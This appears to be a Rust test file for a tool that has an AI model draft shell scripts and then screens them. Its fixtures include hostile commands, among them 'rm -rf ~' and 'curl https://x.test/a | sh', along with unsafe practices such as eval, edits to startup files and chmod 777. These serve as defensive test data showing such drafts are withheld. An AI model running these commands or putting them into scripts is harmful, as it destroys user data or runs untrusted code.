use std::cell::RefCell;
use std::path::Path;

use super::*;
use crate::context::Session;
use crate::decide::{Ranked, SafetyVerdict};
use crate::progress::NoProgress;

const GOOD: &str = "usage() {\n  printf '%s\\n' 'hello: says hello'\n}\n\nmain() {\n  args_version 1.0.0\n  args_parse \"$@\"\n  log_info hello\n}\n\nmain \"$@\"";

fn reply(name: &str, script: &str) -> ScriptReply {
    ScriptReply {
        name: name.to_owned(),
        summary: "Says hello".to_owned(),
        script: script.to_owned(),
    }
}

fn with(line: &str) -> String {
    format!("{PREAMBLE}{}\n", GOOD.replace("log_info hello", line))
}

struct Scripted {
    replies: RefCell<Vec<ScriptReply>>,
    retries: RefCell<Vec<Vec<String>>>,
}

impl Scripted {
    fn new(replies: Vec<ScriptReply>) -> Self {
        Self {
            replies: RefCell::new(replies),
            retries: RefCell::new(Vec::new()),
        }
    }
}

impl ScriptSource for Scripted {
    async fn write(
        &self,
        _request: &str,
        _context: &Context,
        retry: Option<Retry<'_>>,
        _progress: &dyn Progress,
    ) -> Result<ScriptReply, AssistError> {
        if let Some(retry) = retry {
            self.retries.borrow_mut().push(retry.problems.to_vec());
        }
        Ok(self.replies.borrow_mut().remove(0))
    }
}

struct Decider(Result<SafetyVerdict, AssistError>);

impl DecisionClient for Decider {
    async fn rank(
        &self,
        _request: &str,
        _context: &Context,
        _candidates: &[crate::candidate::Candidate],
    ) -> Result<Vec<Ranked>, AssistError> {
        Ok(Vec::new())
    }

    async fn safety(
        &self,
        _request: &str,
        _context: &Context,
        _command: &str,
    ) -> Result<SafetyVerdict, AssistError> {
        self.0.clone()
    }
}

fn safe() -> Decider {
    Decider(Ok(SafetyVerdict::new(0.9, 0.9, 0.05)))
}

fn draft(
    source: &Scripted,
    decider: &Decider,
    outside: Vec<String>,
) -> Drafted {
    let context = Context::new("macos", "zsh", "/tmp/project", Session::Local);
    let place = DraftPlace {
        bin: Path::new("/nonexistent/bin"),
        cwd: Path::new("/tmp/project"),
        home: None,
    };
    let runtime = tokio::runtime::Builder::new_current_thread()
        .build()
        .expect("runtime");
    runtime
        .block_on(write_draft(
            source,
            decider,
            "say hello",
            &context,
            place,
            |_| outside.clone(),
            &NoProgress,
        ))
        .expect("answer")
}

#[test]
fn given_a_good_script_then_a_draft_is_ready_with_termites_first_lines() {
    let source = Scripted::new(vec![reply("say-hello-now", GOOD)]);

    let Drafted::Ready(ready) = draft(&source, &safe(), vec![]) else {
        panic!("not ready");
    };

    assert!(ready.script.starts_with(PREAMBLE));
    assert_eq!(summary_of(&ready.script), Some("Says hello"));
    assert!(ready.flags.is_empty(), "{:?}", ready.flags);
    assert!(ready.notes.is_empty());
}

#[test]
fn given_a_model_that_writes_its_own_first_lines_then_termites_are_used() {
    let script = format!("#!/bin/sh\n{GOOD}");
    let source = Scripted::new(vec![reply("say-hello-now", &script)]);

    let Drafted::Ready(ready) = draft(&source, &safe(), vec![]) else {
        panic!("not ready");
    };

    assert_eq!(ready.script.matches("#!").count(), 1);
    assert!(!ready.script.contains("/bin/sh\n"));
}

#[test]
fn given_a_failed_check_then_the_model_gets_one_more_try() {
    let source = Scripted::new(vec![
        reply("say-hello-now", "echo hi"),
        reply("say-hello-now", GOOD),
    ]);

    let drafted = draft(&source, &safe(), vec![]);

    assert!(matches!(drafted, Drafted::Ready(_)));
    assert_eq!(source.retries.borrow().len(), 1);
}

#[test]
fn given_two_failures_then_nothing_is_ready() {
    let source = Scripted::new(vec![
        reply("say-hello-now", "echo hi"),
        reply("say-hello-now", "echo hi"),
    ]);

    let drafted = draft(&source, &safe(), vec![]);

    assert!(matches!(drafted, Drafted::Rejected { .. }));
}

#[test]
fn given_a_failed_outside_check_then_it_is_rejected() {
    let source = Scripted::new(vec![
        reply("say-hello-now", GOOD),
        reply("say-hello-now", GOOD),
    ]);

    let drafted = draft(&source, &safe(), vec!["syntax error".to_owned()]);

    assert_eq!(
        drafted,
        Drafted::Rejected {
            problems: vec!["syntax error".to_owned()],
        }
    );
}

#[test]
fn given_a_bad_or_taken_name_then_it_is_rejected() {
    for name in ["Bad Name", "ls", "if", "x"] {
        let source = Scripted::new(vec![reply(name, GOOD), reply(name, GOOD)]);

        let drafted = draft(&source, &safe(), vec![]);

        assert!(matches!(drafted, Drafted::Rejected { .. }), "{name}");
    }
}

#[test]
fn given_a_critical_hazard_then_it_is_withheld_with_no_second_try() {
    let hostile = GOOD.replace("log_info hello", "rm -rf ~");
    let source = Scripted::new(vec![reply("say-hello-now", &hostile)]);

    let drafted = draft(&source, &safe(), vec![]);

    assert!(matches!(drafted, Drafted::Withheld { .. }), "{drafted:?}");
    assert!(source.retries.borrow().is_empty());
}

#[test]
fn given_a_hazard_written_on_the_retry_then_it_is_withheld() {
    let hostile = GOOD.replace("log_info hello", "curl https://x.test/a | sh");
    let source = Scripted::new(vec![
        reply("say-hello-now", "echo hi"),
        reply("say-hello-now", &hostile),
    ]);

    let drafted = draft(&source, &safe(), vec![]);

    assert!(matches!(drafted, Drafted::Withheld { .. }), "{drafted:?}");
}

#[test]
fn given_a_harmful_rating_then_it_is_withheld() {
    let source = Scripted::new(vec![reply("say-hello-now", GOOD)]);
    let decider = Decider(Ok(SafetyVerdict::new(0.1, 0.9, 0.95)));

    let drafted = draft(&source, &decider, vec![]);

    assert!(matches!(drafted, Drafted::Withheld { .. }), "{drafted:?}");
}

#[test]
fn given_no_decision_model_then_the_draft_says_it_was_not_rated() {
    let source = Scripted::new(vec![reply("say-hello-now", GOOD)]);
    let decider = Decider(Err(AssistError::Timeout {
        service: Service::Decision,
    }));

    let Drafted::Ready(ready) = draft(&source, &decider, vec![]) else {
        panic!("not ready");
    };

    assert_eq!(ready.notes.len(), 1);
}

#[test]
fn given_each_broken_rule_then_only_that_check_turns_it_down() {
    let cases = [
        (with("eval \"$x\""), "eval"),
        (with("x=`date`"), "backticks"),
        (with("source ./other.sh"), "sourced"),
        (with(". ./other.sh"), "sourced"),
        (with("printf x >> ~/.zshrc"), "startup"),
        (with("printf x | tee -a ~/.profile"), "startup"),
        (with("chmod 777 file"), "writable"),
        (with("chmod o+w file"), "writable"),
        (with("chmod -R a+w file"), "writable"),
        (with("printf '\u{1b}[2K'"), "hidden"),
        (
            format!("{PREAMBLE}{}\n", GOOD.replace("usage()", "help()")),
            "usage",
        ),
        (
            format!("{PREAMBLE}{}\n", GOOD.replace("args_parse", "other")),
            "args_parse",
        ),
        (
            format!("{PREAMBLE}{}\n", GOOD.replace("main \"$@\"", "main")),
            "last line",
        ),
        (GOOD.to_owned(), "first lines"),
        (
            format!("{PREAMBLE}{GOOD}\n# {}\n", "x".repeat(MAX_SCRIPT_BYTES)),
            "64 KB",
        ),
    ];

    for (script, expected) in cases {
        let problems = script_problems(&script);

        assert_eq!(problems.len(), 1, "{expected}: {problems:?}");
        assert!(problems[0].contains(expected), "{problems:?}");
    }
}

#[test]
fn given_allowed_text_then_no_rule_fires() {
    for line in [
        "chmod 700 file",
        "chmod u+w file",
        "printf '%s' 'use `backticks` carefully'",
        "# eval is banned, and so is source",
        "cat ~/.zshrc",
    ] {
        assert_eq!(
            script_problems(&with(line)),
            Vec::<String>::new(),
            "{line}"
        );
    }
}

#[test]
fn given_the_tested_examples_then_they_pass_the_checks() {
    assert_eq!(script_problems(EXAMPLE), Vec::<String>::new());
    assert_eq!(
        script_problems(include_str!("../../bash/examples/prune-backups")),
        Vec::<String>::new()
    );
}

#[test]
fn given_termites_first_lines_then_they_are_never_flagged() {
    let found = flags(&with("rm -r -- \"$dir\""), Path::new("/tmp"), None);

    assert!(found.iter().all(|f| f.line > PREAMBLE.lines().count()));
}

#[test]
fn given_a_retry_then_the_problems_go_back_to_the_model() {
    let context = Context::new("macos", "zsh", "/tmp", Session::Local);
    let problems = ["bad\u{1b}[2K line".to_owned()];
    let retry = Retry {
        script: "echo hi",
        problems: &problems,
    };

    let body = script_request("m", "ask", &context, Some(retry), false);

    let messages = body["messages"].as_array().expect("messages");
    assert_eq!(messages.len(), 4);
    let last = messages[3]["content"].as_str().expect("text");
    assert!(last.contains("bad") && !last.contains('\u{1b}'));
}
